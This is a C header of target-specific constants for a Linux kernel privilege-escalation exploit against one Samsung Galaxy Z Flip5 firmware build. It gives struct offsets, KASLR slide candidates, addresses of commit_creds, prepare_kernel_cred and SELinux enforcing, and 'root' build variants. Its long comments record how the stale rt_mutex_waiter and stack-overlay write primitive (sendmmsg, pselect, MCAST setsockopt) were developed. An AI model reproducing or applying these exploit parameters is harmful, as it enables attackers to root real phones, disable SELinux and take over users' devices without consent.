#ifndef OFFSET_H
#define OFFSET_H

/*
 * SM-F731B (Galaxy Z Flip5, international) -- Snapdragon 8 Gen 2, b5q
 *
 *   AP/PDA        F731BXXS7GZF1        CSC OXM
 *   kernel        5.15.189-android13-8-33404244-abF731BXXS7GZF1
 *   KMI           android13-5.15       toolchain clang 14.0.7
 *
 *   kernel Image  46860800 bytes
 *                 SHA-256 BAC978D97C5A0D269EEE11B22EB1A770416AEF6DFC3C7B80B91430F526AE6648
 *   raw BTF       [0x21ef2ac, 0x27bf188)
 *                 SHA-256 047909BAE9B9AA860473870CBD3EABDDE23C468088461802745C29D3C508023D
 *   abl.elf       SHA-256 56c687ec374ab672909c6ab1fb12b1b0a591ad1e11ad8608dfdb158ed57d21ad
 *
 * This is an android13-5.15 target. It is NOT a variant of the S25 profiles:
 * only the security patch date is shared. Every structure
 * layout below was taken from this kernel's own BTF, and the values form a
 * genuine hybrid -- pool_workqueue matches the 6.6 targets (nr_active 0x5c)
 * while worker_pool matches the 5.10 target (worklist 0x20), so copying
 * either sibling wholesale would have been wrong.
 */

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define SLIDE_MCAST_DOMAIN AF_INET6
#define SLIDE_MCAST_LEVEL IPPROTO_IPV6
#define SLIDE_MCAST_OPTION MCAST_JOIN_SOURCE_GROUP
#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 8
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 8
#define BUILD_VARIANT_LABEL \
  "b5q-F731BXXS7GZF1-mcast-adaptive-p0-bounded-pipe-root"
#define APP_PHYS_P0_ORACLE 1
#define APP_REQUIRE_FRESH_P0_SESSION 1
#define APP_TRACEFS_SLIDE 1
#define APP_PREFETCH_SLIDE 1
#define APP_PREFETCH_SLIDE_DEFAULT 0
#define SLIDE_PREFETCH_SCAN_STEP 0x8000ULL
#define SLIDE_PREFETCH_MAX_OFFSET 0x1f0000ULL
#define SLIDE_PREFETCH_SAMPLES 32
#define SLIDE_PREFETCH_BURST 512
#define SLIDE_PREFETCH_EDGE_RUN 8
#define SLIDE_PREFETCH_REPEATS 5
#define SLIDE_PREFETCH_MIN_CONSENSUS 3
#define APP_CLOSED_FOPS_ROUTE 1
#define APP_FOPS_REUSE_VERIFIED_PAGE 1
#define APP_FOPS_REWRITE_RECLAIMED_PAGE 1
#define APP_FOPS_REWRITE_RECLAIMED_PAGE_DEFAULT 0
#define APP_CONTROLLED_MM_GROUP_RECLAIM 1
/*
 * Keep retries inside the one fresh P0 child.  A clean gate miss has not
 * modified P0 and can safely reclaim another page; restarting a supervisor
 * after a real gate hit cannot be made safe.  Run one PI/MCAST write at a
 * time and use downstream pipe readback to decide whether another probe is
 * needed; blind repeated tree operations are deliberately disabled.
 */
#define APP_SLIDE_FRESH_PAGE_ATTEMPTS 2
#define APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE 1
#define APP_P0_REDUNDANT_SLOT_WRITES 1
#define APP_P0_PROBE_ATTEMPTS 3
#define APP_P0_NONDESTRUCTIVE_PROBE_SCAN 1
#define APP_FOPS_FRESH_PAGE_ATTEMPTS 3
#define APP_FOPS_FINE_DELAY_PER_ROUTE 1
#define APP_FOPS_ALWAYS_VERIFY_WRITE 1
#define APP_FOPS_AUTHORITATIVE_READBACK 1
/*
 * A complete controlled order-3 page needs 32 retained mm_struct objects.
 * Collision measurement dominates that collection time.  Try the sampling
 * depth hardware-validated by the E2S fast profile remains available for
 * diagnostics, while retaining the original 128/8 profile as an automatic
 * per-object fallback in util.c.  It produced no successful leaks in the
 * Flip5 hardware trials, so do not pay its setup cost by default.  Set
 * RMG_CONTROLLED_FAST=1 explicitly for future A/B tests.
 */
#define APP_CONTROLLED_FAST_KSNITCH 1
#define APP_CONTROLLED_FAST_KSNITCH_DEFAULT 0
#define CONTROLLED_KSNITCH_FAST_APPENDED_FUTEXES 256
#define CONTROLLED_KSNITCH_FAST_REPEAT_MEASUREMENT 32
#define CONTROLLED_KSNITCH_FAST_AVERAGE 4
#define APP_FOPS_ROUTE_COARSE_DELAY_USEC 50000
#define APP_FOPS_ROUTE_FINE_DELAY_TICKS \
  0ULL, 0x10ULL, 0x20ULL, 0x30ULL, 0x40ULL, 0x60ULL, 0x80ULL, 0x18ULL
#define APP_FOPS_BEFORE_PIPE 1
#define APP_EXACT_PIPE_BUFFER_ONLY 1
#define APP_PRODUCTION_STACK_PI_RIGHT_ONLY 1
#define APP_ROOT_REF_HOLDER_REQUIRED 0
#define DEFAULT_EXPLOIT_ATTEMPTS 1
#define DEFAULT_ATTEMPT_TIMEOUT_SEC 2200
#define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 1200
#else
#define BUILD_VARIANT_LABEL "b5q-F731BXXS7GZF1-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
/* Read from the device. Unlike the Japanese pa1q builds, this international
 * OXM firmware carries NO CSC suffix on the incremental. */
#define BUILD_FINGERPRINT "samsung/b5qxxx/b5q:16/BP4A.251205.006/F731BXXS7GZF1:user/release-keys"
#endif

/* 5.15 links at the 6.1-style base, not the 6.6 one. */
#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL

/*
 * rt_mutex_waiter on 5.15 is the flat pre-6.2 layout, size 0x58:
 *   tree_entry 0x00  pi_tree_entry 0x18  task 0x30  lock 0x38
 *   wake_state 0x40  prio 0x44  deadline 0x48  ww_ctx 0x50
 * wake_state and prio are adjacent 32-bit fields sharing one qword, and a
 * ww_ctx word follows -- that is exactly COMPACT_RT_MUTEX_WAITER. The 5.10
 * a15 target uses LEGACY instead (prio alone at 0x40, no wake_state), so the
 * two are not interchangeable.
 */
#define COMPACT_RT_MUTEX_WAITER 1

/*
 * P0_KERNEL_PHYS_LOAD was initially a candidate inferred from the ABL. The
 * app-domain P0 sample in files/exploit.log matched the exact raw kernel
 * Image at slide 0x178000 (all eight words, unique in the 4K candidate table),
 * confirming this physical alias on the device. The earlier zero-score result
 * came from the old 64K table, which omitted that slide.
 *
 * The ABL constant table is byte-identical to the S25 bootloaders
 *   0x20000000 0x00000000 0x00080000 0x05600000 0x03c00000 0x00008000
 * (ARM64 load offset 0x00080000, kernel region size 0x05600000), but the
 * physical memory map is different, so the S25 conclusion does not carry:
 *
 *   gunyah_hyp_region@80000000 spans [0x80000000, 0x80a00000)  (0xa00000,
 *     versus 0xe00000 on the S25), so 0x80000000 + 0x80000 again collides.
 *
 *   Free windows large enough for the 0x05600000 kernel region:
 *     0x82800000 .. 0x8a800000   (0x8000000)   <- first
 *     0xa2a80000 .. 0xd4d00000   (0x32280000)
 *
 * On the S25 the first sufficiently large window started at 0xa7000000 and
 * the true value (0xa8000000, device-confirmed) sat 0x1000000 inside it --
 * so "start of the first large window" is not a reliable rule, and there is
 * no device-tested sibling for this platform to corroborate against.
 *
 * The earlier candidate analysis is retained above for provenance; this
 * address is now confirmed by the device fingerprint evidence.
 */
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xa8000000ULL /* confirmed by app-domain P0 sample */

/*
 * Tracefs observed slides of 0x1d0000 and 0x108000 on different boots.
 * The physical P0 fingerprint table covers every 4K slide from 0 through
 * 0x1f0000 using this exact kernel Image and P0_ORACLE_PROBE_OFFSET. This
 * includes both observations. The latest failed app run's eight-word P0
 * sample matches slide 0x178000 at 8/8 (runner-up 0); the previous 64K table
 * scored it 0/8. Repeated image pages tie and are rejected by the oracle.
 *
 * The separate SLIDE_VA_PROBE_* values are legacy and remain disabled.
 */

/* TODO(verify): constant across all seven existing targets and both SoC
 * vendors, so carried, but not re-derived for 5.15. */
#define SKB_DATA_DELTA (-0xe80LL)

/*
 * KernelSnitch brute-forces mm_struct candidates at a stride of MM_STRUCT_SZ
 * within a slab of (PAGE_SIZE << MM_ORDER), so the stride must be the slab
 * OBJECT size, not sizeof(struct mm_struct).
 *
 * mm_cachep objects are aligned to the arm64 128-byte cacheline:
 *   S25   6.6 : sizeof 0x4c0 -> 0x500   (matches common.h's default, which is
 *                                        why the S25 targets never override it)
 *   Flip5 5.15: sizeof 0x3e0 -> 0x400
 *
 * With the inherited 0x500 the walk steps past every real mm_struct and the
 * leak fails on every retry -- observed on this device before this override.
 */
#define MM_STRUCT_SZ 0x400
/* MM_ORDER left at the common.h default of 3: (4096 << 3) / 0x400 == 32
 * objects per slab, which is a plausible SLUB choice for this object size.
 * If the leak still fails, this is the next thing to vary. */

/* 5.15 kmalloc slab topology: cgroup type at index 1, three total types
 * (versus 6.6's default index 2, four types). Matches the S918B profile. */
#define KMALLOC_CGROUP_TYPE 1
#define KMALLOC_CACHE_TYPES 3

#define MM_ORDER 3
#define KSNITCH_COLLISIONS 4
#define KERNELSNITCH_THRESHOLD_MULT 10
#define FAKE_WAITER_PRIO 130

/* Initial controlled-reclaim tuning from the hardware-proven S918B 5.15.189
 * route. Keep these explicit so the updated shared payload compiles and the
 * first b5q validation run has the same conservative scan/reclaim geometry. */
#define S918_PAGE_SCAN_MAX 256
#define S918_KSNITCH_HINT_COLLISIONS 2
#define S918_KSNITCH_FULL_COLLISIONS 5
#define S918_DMA32_SKIP_SLABS 8
#define S918_TRIGGER_SLABS 24
#define S918_SKB_SENDS 256
#define S918_SKB_SNDBUF 8388608
#define S918_RECLAIM_SOCKET_PAIRS 32

#define P0_PAGE_OFFSET 0xffffff8000000000ULL
/* MCAST stack writer route: SLIDE_FAKE_WAITER_PRIO 0 and LOCK_OWNER 0
 * match the S918B hardware-verified configuration. The old values (120/1)
 * were for the abandoned pselect/sendmmsg PAGE_PAYLOAD_SLIDE mode. */
#define SLIDE_FAKE_WAITER_PRIO 0
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE 0ULL
#define SLIDE_USE_FAKE_TASK 1
#define SLIDE_WAIT_NSEC 2000000000L
#define SLIDE_REQUEUE_ARM_USEC 20000
#define LEGACY_RT_MUTEX_WAITER 0

#define SKB_SEND_SIZE 0x8e80
#define SKB_RECLAIM_SENDS 64
#define APP_SLIDE_RECLAIM_SENDS 64
#define PIPE_MAX_ATTEMPTS 12
#define PIPE_PREPARE_TIMEOUT_MS 30000
#define PIPE_PREPARE_REAP_TIMEOUT_MS 1000
#define KERNELSNITCH_WAITER_READY_TIMEOUT_MS 30000

/*
 * BLOCKER: the pselect fake-lock route cannot work on this kernel as-is.
 *
 * The route relies on core_sys_select's on-stack fd_set copies landing on top
 * of the stale rt_mutex_waiter left by futex_wait_requeue_pi. Measuring both
 * call chains from the syscall entry SP (S):
 *
 *   pselect  __arm64_sys_pselect6 0xa0 + core_sys_select 0x1c0 = 0x260
 *            stack_fds at sp+0x50   -> S-0x210 .. S-0x110  (0x100 bytes)
 *   futex    __arm64_sys_futex 0x80 + do_futex 0x140
 *                                   + futex_wait_requeue_pi 0x1b0 = 0x370
 *            rt_waiter candidates   -> S-0x2d8 .. S-0x368
 *
 * The waiter sits at least 0xc8 bytes BELOW the fd_set buffer, so the copied
 * fd_sets never reach it. The kernel then walks stale stack contents as an
 * rb-tree, which is the observed panic.
 *
 * The same computation on S25 CZF1 (6.6) puts the waiter at sp+0x90 = S-0x200
 * and stack_fds at sp+0x80 = S-0x200 -- coincident, i.e. SHIFT 0, matching the
 * value that profile actually uses. The model is therefore calibrated.
 *
 * The difference is do_futex's frame: 0x140 here versus 0x60 on 6.6, which
 * pushes the waiter ~0xe0 deeper while the pselect side is unchanged.
 *
 * No SLIDE_PSELECT_WORD_SHIFT value fixes this -- it would have to be about
 * -25 words, and the in/out/ex logical array is only 15 words at nfds=320.
 * A larger nfds does not help either: the buffer base stays at sp+0x50 and
 * grows upward, away from the waiter, and beyond 6*FDS_BYTES > 256 the kernel
 * switches to kmalloc and leaves the stack entirely.
 *
 * rt_waiter's location is not a guess: futex_wait_requeue_pi passes
 * `add x3, sp, #0x98` immediately before `bl rt_mutex_slowlock_block`, whose
 * 4th argument is the waiter (x27 is loaded with the same address earlier).
 *
 * Survey of alternative spray vehicles on this kernel:
 *
 *   pselect6  sys 0xa0 + core_sys_select 0x1c0 = 0x260
 *             stack_fds sp+0x50 -> S-0x210 .. S-0x110   too shallow by 0xc8
 *   select    sys 0x80 + core_sys_select 0x1c0 = 0x240  shallower still
 *   writev    do_writev 0x120, iovstack sp+0x38 -> ~S-0xe8   far too shallow
 *   recvmsg   ____sys_recvmsg 0xf0, iovstack sp+0x90 -> ~S-0x100  too shallow
 *   ppoll     sys 0x80 + do_sys_poll 0x3f0 = 0x470
 *             stack_pps sp+0x70, struct poll_list {next; int len;
 *             entries[]} so entries at sp+0x7c, 30 (N_STACK_PPS) x 8 bytes
 *             -> S-0x3f4 .. S-0x304                     too DEEP by 0x2c
 *
 * (sp+0x170 in do_sys_poll is the 624-byte struct poll_wqueues, memset at
 * entry -- not the pollfd buffer.)
 *
 * The waiter falls in the GAP between the pselect buffer above it and the
 * ppoll buffer below it -- but sendmmsg DOES reach it:
 *
 *   sendmmsg  __arm64_sys_sendmmsg 0x10 (stp x29,x30,[sp,#-0x10]! -- a
 *             PRE-INDEXED prologue, easy to miss when only grepping for
 *             `sub sp`) + __sys_sendmmsg 0x160 + ___sys_sendmsg 0x1a0 = 0x310
 *             iovstack sp+0x48 (proved: `add x8, sp, #0x48; str x8, [sp]`
 *             i.e. iov = iovstack), 8 x sizeof(struct iovec) = 128 bytes
 *             -> S-0x2c8 .. S-0x248
 *
 *   waiter    S-0x2d8 .. S-0x280
 *   overlap   S-0x2c8 .. S-0x280  = 0x48 of the waiter's 0x58 bytes
 *
 * struct iovec is {void *iov_base; size_t iov_len} -- both fully controlled
 * 64-bit values with no kernel writeback, and __import_iovec copies the user
 * array in before validating it, so even an EFAULT/EINVAL call leaves the
 * data in place. That covers waiter offsets 0x10..0x50: tree_entry.rb_left,
 * the whole pi_tree_entry, task, lock, wake_state/prio, deadline and ww_ctx.
 *
 * Not covered: tree_entry.__rb_parent_color (0x00) and tree_entry.rb_right
 * (0x08). Those land on ___sys_sendmsg's sp+0x38 / sp+0x40; the function
 * zeroes sp+0x8..0x38 on entry, so 0x00 is most likely 0 rather than junk.
 *
 * remove_waiter() erases BOTH trees -- rt_mutex_dequeue() via tree_entry and
 * rt_mutex_dequeue_pi() via pi_tree_entry -- so tree_entry does not need to
 * be useful, but it does need to be benign:
 *
 *   waiter+0x00 tree_entry.__rb_parent_color = ___sys_sendmsg sp+0x38.
 *     ZEROED: the block at eb34..eb40 clears sp+0x8..0x40 before
 *     __copy_msghdr_from_user (stp xzr,xzr,[sp,#0x30] covers 0x30-0x3f).
 *     parent == NULL, so __rb_change_child writes into the real
 *     lock->waiters.rb_node. Harmless.
 *
 *   waiter+0x08 tree_entry.rb_right = sp+0x40. Also benign, by inheritance.
 *     The ONLY instructions touching sp+0x40..0x47 in ___sys_sendmsg are
 *     `str wzr,[sp,#0x44]` and `ldr w2,[sp,#0x44]` -- the upper dword only.
 *     sp+0x40..0x43 is never written, so the slot keeps whatever the previous
 *     stack occupant left. That occupant is the futex chain: sp+0x40 is
 *     absolute S-0x2d0, which is futex_wait_requeue_pi's sp+0xa0, i.e.
 *     waiter+0x08 -- tree_entry.rb_right itself. rb_link_node() sets
 *     rb_left = rb_right = NULL on enqueue, so it is 0.
 *
 *     Nothing overwrites it in between: __arm64_sys_sendmmsg (S-0x10) and
 *     __sys_sendmmsg (S-0x170) are shallower than S-0x2d0; ___sys_sendmsg's
 *     callees allocate below S-0x310; and the futex return path only restores
 *     registers. (Assumes the waiter is a leaf, i.e. sole waiter on the
 *     rt_mutex, which the exploit arranges.)
 *
 * (The x29-relative `stp xzr` block near function entry clears
 * sp+0xc8..0x148, a different structure above iovstack, not this one.)
 *
 * A single-vehicle sendmsg route is impossible: to make sendmsg dwell (block
 * in the send path) its iov_base must pass access_ok as a user address, but
 * iov_base IS the planted value and the waiter is full of kernel pointers --
 * mutually exclusive. That dead end is resolved by NOT needing sendmsg to
 * dwell; the combined-vehicle route below plants via a FAILING sendmmsg and
 * dwells via pselect. See that note for details.
 *
 * Frame sizes were verified: every function in both chains uses a plain
 * `sub sp, sp, #imm` prologue (no pre-indexed stp), and the waiter offset is
 * confirmed from two independent call sites -- rt_mutex_wait_proxy_lock
 * (arg 3) and rt_mutex_cleanup_proxy_lock (arg 2) on 6.6, and
 * rt_mutex_slowlock_block (arg 4) on 5.15. The same model reproduces the
 * shipping S25 CZF1 value (SHIFT 0) exactly, so it is calibrated.
 */

/*
 * COMBINED-VEHICLE ROUTE. pselect's fd_set buffer is 0xc8 too shallow to
 * reach the waiter (see the long note above), but the waiter at S-0x2d8 also
 * sits BELOW pselect's whole 0x260 frame -- so pselect never overwrites it.
 * That lets us plant the fake waiter with one syscall and dwell with another:
 *
 *   PLANT  sendmmsg with a kernel-pointer iovec. iovec_from_user copies the
 *          array to iovstack (S-0x2c8) BEFORE access_ok rejects it, so the
 *          -EFAULT return leaves waiter qwords 2..10 on the kernel stack.
 *   DWELL  pselect (empty sets, timeout). Its frame bottoms at S-0x260,
 *          above the waiter, so the plant survives the whole sleep.
 *   FIRE   the existing sched_setattr consumer walks the intact waiter.
 *
 * iovstack sits at waiter+0x10, so it covers qwords 2..10. Mapping (iovstack
 * is struct iovec[]{void*base; size_t len}, both raw-copied):
 *   iov[0] = { waiter[2]=tree_left,  waiter[3]=pi_pc   }
 *   iov[1] = { waiter[4]=pi_right=0, waiter[5]=pi_left }
 *   iov[2] = { waiter[6]=task,       waiter[7]=lock    }
 *   iov[3] = { waiter[8]=state+prio, waiter[9]=0       }
 *   iov[4] = { waiter[10]=ww_ctx=0,  pad               }
 *
 * STATUS (on-device, iterated): the route is built and the plant is confirmed
 * to execute --
 *   - socketpair(AF_UNIX,SOCK_DGRAM) succeeds (diagnostic logs sock fd);
 *   - sendmmsg reaches __import_iovec; iovec_from_user's native _copy_from_user
 *     runs BEFORE the post-copy EINVAL return, so the 5-iovec residue lands on
 *     iovstack at S-0x2c8 (waiter+0x10).
 * Two real bugs in the approach were found and fixed:
 *   1. tree_entry qword1 (rb_right, uninitialised) is zeroed by a priming
 *      ppoll (do_sys_poll memsets S-0x300..S-0x90) before the plant.
 *   2. pselect is NOT a usable dwell: it sleeps inside do_select, whose 0x3c0
 *      frame (SP at S-0x620) engulfs the waiter and overwrites the plant.
 *      nanosleep is used instead (frame 0x150, SP at S-0x150, above the
 *      waiter), so the plant survives the sleep.
 *
 * DESPITE all that it still panics during the sched_setattr PI-walk. The
 * remaining uncontrolled value is qword0 (tree_entry.__rb_parent_color): the
 * combine forces it to 0 (___sys_sendmsg's msghdr clear), whereas the working
 * pselect route sets it to slide_oracle_parent. Whether the walk needs it, or
 * whether the panic is elsewhere (write-target validity, an rt_mutex internal
 * that differs from 6.6), cannot be distinguished without kernel-side panic
 * observability -- which needs root, the very thing this produces. Blind
 * reboot-iteration has poor expected value past this point.
 *
 * Both resume ideas were then checked and BOTH fail:
 *   (a) sp+0x38 is NOT a msghdr field -- ___sys_sendmsg's kernel msghdr
 *       (msg_sys) is at sp+0xc8 (S-0x248); sp+0x38 is zeroed scratch. So
 *       sendmsg args cannot set qword0.
 *   (b) no vehicle covers waiter+0 (S-0x2d8) while also covering waiter+0x10:
 *       recvmsg iovstack lands at S-0x2a8 (too shallow), sendmmsg at S-0x2c8
 *       (waiter+0x10), recvmmsg at S-0x348 (too deep). The waiter's first
 *       qword sits in the gap, and any second planter deep enough to write it
 *       also passes through S-0x2c8 and clobbers the sendmmsg plant. sendmmsg
 *       itself always zeroes qword0 (msghdr clear), so it cannot be preserved
 *       from a prior write either.
 *
 * VMEMMAP_START was also checked and is correct: -(1 << (VA_BITS - 6)) =
 * 0xfffffffe00000000 for both 5.15 and 6.6 (STRUCT_PAGE_MAX_SHIFT is a fixed
 * compile-time 6 on both), so slide_oracle_parent's page-struct address is
 * sound. And the waiter offset S-0x2d8 is confirmed from remove_waiter's
 * arg2 (x1 = sp+0x98), not just the slowlock_block call.
 *
 * FINAL CONCLUSION (derived from the kernel disassembly, not the device):
 *
 * Reading rt_mutex_adjust_pi + rt_mutex_adjust_prio_chain and the fake_lock
 * construction (util.c) shows the write primitive IS the stack waiter's
 * tree_entry erase: __rb_erase_augmented -> __rb_change_child writes
 *   *(tree_entry.__rb_parent_color + child_off) = tree_entry.rb_left
 * i.e. *(qword0 + 0x10|0x18) = qword2. qword0 is the write DESTINATION, the
 * core of the primitive -- not incidental. In the PAGE_PAYLOAD_SLIDE mode
 * that P0_ONLY exercises, fake_lock->owner is SLIDE_LOCK_OWNER_VALUE (1),
 * which rt_mutex_owner masks to NULL, so the chain never propagates to an
 * owner and the pi_tree_entry reroute (which would use qword3, controllable)
 * never fires. There is no alternate write path in this mode.
 *
 * Therefore the exploit requires controlling the waiter's FIRST qword, and on
 * this 5.15 stack geometry that qword (S-0x2d8) is unreachable: it sits 0x10
 * above sendmmsg's iovstack (S-0x2c8, the deepest usable copy-and-return
 * plant), sendmmsg zeroes it via the msghdr clear, and no other vehicle
 * covers waiter+0 while remaining usable (recvmsg iovstack S-0x2a8 too
 * shallow, recvmmsg S-0x348 too deep). Setting tree_left=fake_w0 makes the
 * tree_entry erase non-corrupting but leaves the primitive unfired, and the
 * run still panics -- so qword0 is load-bearing beyond just tree consistency.
 *
 * This is a definitive negative result for the pselect stack-overlay route:
 * its write destination lives in the one waiter qword this kernel's syscall
 * stack frames put out of reach. It is not a negative result for the target as
 * a whole: the MCAST writer below reaches the deeper waiter and is the current
 * hardware-verified route. The combined route remains documented
 * here as a record of the earlier analysis, but is deliberately not enabled. */

/*
 * Early MCAST analysis (2026-07-30), recovered from the Xiaomi prebuilt
 * 8550-43499-178-194-v2.so. This experimental loop predates the hardware-proven
 * SLIDE_STACK_WRITER_MCAST implementation now shared with S918B and is retained
 * as derivation history only.
 *
 * setsockopt(fd_inet6, IPPROTO_IPV6, MCAST_JOIN_SOURCE_GROUP, group_source_req,
 * 264) copies the 264-byte struct RAW into do_ipv6_setsockopt's deep frame.
 * b5q chain (AF_INET6 SOCK_DGRAM -> udpv6): sys_setsockopt 0x10 + __sys 0x70 +
 * sock_common_setsockopt 0x10 + udpv6_setsockopt 0x40 + do_ipv6_setsockopt
 * 0x2c0 = 0x3a0. greqs @ do_ipv6 sp+0x40 = S0-0x360; waiter @ S0-0x2d8 =>
 * fake-waiter byte0 at group_source_req offset 0x360-0x2d8 = 0x88.
 */

/* worker_thread 0x0010dacc + 0x78 (insn after `bl schedule`).
 * Device-confirmed: tracefs reports caller=worker_thread+0x78. */
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x0010db44ULL
/* wait_for_vfork_done+0x44 (insn after `bl schedule`); .text identical to
 * S918B so the +0x44 offset carries over directly. */
#define SLIDE_TRACEFS_VFORK_CALLER_OFF 0x000c8fe4ULL

/* Device-measured: the runtime trace event id here is 108, NOT the 109 that
 * slide.c hardcodes as its fallback. The physical-oracle path does not use
 * it, but the tracefs path would be wrong on this target without this. */
#define SLIDE_TRACEFS_EVENT_ID 108

/*
 * Device-measured VA behaviour (read-only, via tracefs):
 *   runtime caller  0xffffffc0082ddb44   (worker_thread+0x78)
 *   link-time       0xffffffc00810db44
 *   VA slide        0x1D0000
 * A later successful boot observed 0x108000, which is not 64K-aligned.
 * Neither observation verifies the physical placement model. See the
 * hardware validation notes in docs/SM-F731B-F731BXXS7GZF1.md.
 */

#define SLIDE_P0_OFFSET_CANDIDATES \
  0x150000ULL, 0x100000ULL, 0x130000ULL, 0x090000ULL, \
  0x1c0000ULL, 0x180000ULL, 0x050000ULL, 0x1a0000ULL, \
  0x160000ULL, 0x0e0000ULL, 0x1e0000ULL, 0x000000ULL, \
  0x010000ULL, 0x020000ULL, 0x030000ULL, 0x040000ULL, \
  0x060000ULL, 0x070000ULL, 0x080000ULL, 0x0a0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0f0000ULL, 0x110000ULL, \
  0x120000ULL, 0x0b0000ULL, 0x170000ULL, 0x140000ULL, \
  0x190000ULL, 0x1b0000ULL, 0x1d0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32

#if defined(APP_PAYLOAD) && APP_PAYLOAD
/* TODO(verify): timing/bank constants carried from the S25 profiles. This is
 * a different SoC and kernel, so these are a starting point only. */
#define ROUTE_WAIT_SECONDS 8
#define PSELECT_ENTER_DELAY_USEC 50000
#define SLIDE_PSELECT_TIMEOUT_NSEC 100000000L
#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE 8
#define SLIDE_BANK_SLOTS 7
#define SLIDE_BANK_TASK_OFF 0x1000
#define SLIDE_BANK_TASK_STRIDE 0x1c0
#define SLIDE_BANK_LOCK_OFF 0x5200
#define SLIDE_BANK_SLOT_STRIDE 0x100
#define SLIDE_BANK_WAITER_OFF 0x40

/* MCAST stack writer: the deep-waiter technique that bypasses the pselect
 * stack-overlay roadblock (waiter qword0 unreachable from fd_set). Build
 * selects the writer via -DSLIDE_STACK_WRITER=1 (MCAST) in the Makefile. */
#define SLIDE_STACK_WRITER_MCAST 1
#define SLIDE_STACK_WRITER_SIGRETURN 2
#ifndef SLIDE_STACK_WRITER
#error b5q stack writer must be set by the build
#endif
/* Flip5 vmlinux disassembly: __arm64_sys_setsockopt 0x10, __sys_setsockopt
 * 0x70, sock_common_setsockopt 0x10, then ipv6_setsockopt's 0x40 frame
 * place do_ipv6_setsockopt at S0-0xd0.
 * do_ipv6_setsockopt allocates 0x60 with its pre-indexed stp and another
 * 0x260, so its total frame is 0x2c0 and greqs is at SP+0x40 = S0-0x350.
 * futex_wait_requeue_pi's waiter is at S0-0x2d8 (sp+0x98 in its 0x1b0
 * frame; the caller frames are 0x140 and 0x80). Thus the copied waiter
 * begins at group_source_req offset 0x350-0x2d8 = 0x78, matching S918B. */
#define MCAST_WAITER_OFF 0x78
#define SIGRETURN_FPSIMD_WAITER_OFF 0x18
#define SIGRETURN_SVE_WAITER_OFF 0x28

#define P0_ORACLE_GATE_SLOT 0
#define P0_ORACLE_PROBE_SLOT 1
#define P0_ORACLE_PROBE_SLOT_COUNT 3
#define P0_ORACLE_GATE_RESTORE_SLOT 4
#define P0_ORACLE_PROBE_RESTORE_SLOT 5
#define P0_ORACLE_PRODUCTION_SLOT 6
#define P0_ORACLE_GATE_PAGE_OFF 0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX 1

/*
 * Probe page doubles as the VA-base leak source. Image page 0x01b5e000 holds
 * crypto_buildtime_address at page offset 0x760 -- a build-time reference to
 * _text that the kernel relocates at boot and never writes. It points at
 * image offset 0, so:
 *
 *   stext = runtime_qword_at(0x760)
 *
 * 0x760 is not a sample offset and lies inside the existing 0xe08 scan
 * window, so no extra oracle cycle is required.
 */
#define P0_ORACLE_PROBE_OFFSET 0x01b5e000ULL
#define SLIDE_VA_PROBE_PAGE_OFF 0x760
#define SLIDE_VA_PROBE_IMAGE_OFF 0x00000000ULL

#define P0_FINGERPRINT_HEADER \
  "targets/b5q-F731BXXS7GZF1/p0_fingerprint.h"
#endif

#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

#define MM_DMA32_ALIAS_START 0xffffff8000000000ULL
#define MM_DMA32_ALIAS_END 0xffffff8080000000ULL
#define MM_NORMAL_ALIAS_START MM_DMA32_ALIAS_END
#define MM_NORMAL_ALIAS_END KERNELSNITCH_IDENTITY_END

#define APPENDED_FUTEXES 4096
#define REPEAT_MEASUREMENT 128
#define AVERAGE 8
#define KERNELSNITCH_BASELINE_SAMPLES 8
#define KERNELSNITCH_BASELINE_QUANTILE 1

/* task_struct cred offsets from BTF (identical to S918B: same 5.15 layout). */
#define TASK_STRUCT_CRED_OFF      0x798ULL
#define TASK_STRUCT_REAL_CRED_OFF 0x790ULL

/* .text cred helpers -- confirmed identical between b5q and S918B builds
 * (vmlinux.nm: prepare_kernel_cred at ffffffc00811e3c8). */
#define PREPARE_KERNEL_CRED_OFF   0x0011e3c8ULL
#define COMMIT_CREDS_OFF          0x00120104ULL
#define OVERRIDE_CREDS_OFF        0x0011f1dcULL

/* ashmem_misc 0x02bfcf18 + offsetof(miscdevice, fops) 0x10; verified against
 * the image: minor==255, name=="ashmem", fops slot holds ashmem_fops. */
#define ASHMEM_MISC_FOPS_OFF 0x02bfcf28ULL
#define ASHMEM_FOPS_OFF 0x0200d3f8ULL
#define ASHMEM_IOCTL_OFF 0x0114c6dcULL
#define ASHMEM_COMPAT_IOCTL_OFF 0x0114cd38ULL
#define ASHMEM_MMAP_OFF 0x0114cd90ULL
#define ASHMEM_OPEN_OFF 0x0114d070ULL
#define ASHMEM_RELEASE_OFF 0x0114d108ULL
#define ASHMEM_SHOW_FDINFO_OFF 0x0114d224ULL
#define CONFIGFS_READ_ITER_OFF 0x005d7420ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x005d7e48ULL
/* 5.15 name is generic_file_splice_read, not copy_splice_read. */
#define COPY_SPLICE_READ_OFF 0x00528198ULL
#define NOOP_LLSEEK_OFF 0x004bbd34ULL
#define INIT_TASK_OFF 0x02c05080ULL
#define ROOT_TASK_GROUP_OFF 0x02cb9ac0ULL
/* selinux_state 0x02d8e5c0 (size 0x88); BTF gives offsetof(enforcing)==0. */
#define SELINUX_ENFORCING_OFF 0x02d8e5c0ULL
#define KMALLOC_CACHES_OFF 0x020643b8ULL
#define ANON_PIPE_BUF_OPS_OFF 0x01e7f3a0ULL

